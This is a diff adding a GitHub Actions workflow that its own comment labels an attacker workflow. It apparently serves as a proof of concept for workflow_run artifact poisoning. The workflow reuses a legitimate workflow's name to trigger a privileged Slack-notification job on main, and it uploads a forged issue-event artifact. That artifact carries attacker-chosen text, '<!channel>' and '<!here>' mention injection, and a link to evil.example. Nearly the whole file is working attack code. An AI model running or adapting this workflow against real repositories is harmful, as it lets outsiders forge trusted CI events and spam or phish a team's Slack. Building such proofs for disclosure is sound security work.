@@ -1,0 +1,33 @@
+name: Gardener - Notify Event
+# Attacker workflow on a non-default branch, reusing the exact same workflow
+# NAME as the legitimate capture workflow. Its successful completion fires the
+# privileged `Gardener - Notify Slack` workflow_run workflow on main.
+on: push
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft arbitrary event payload
+        run: |
+          cat > event.json <<'JSON'
+          {
+            "action": "opened",
+            "issue": {
+              "number": 19,
+              "html_url": "https://github.com/PDFtoMark/gab-poc-wfr-artifact/issues/19",
+              "title": "forged title chosen by attacker",
+              "body": "Forged artifact body\n\n```\n<!channel> mention from forged artifact\n```\n\n[click](https://evil.example/y><!here>)",
+              "user": {"login": "attacker"},
+              "labels": []
+            }
+          }
+          JSON
+      - name: Upload forged artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: gardener-event
+          path: event.json
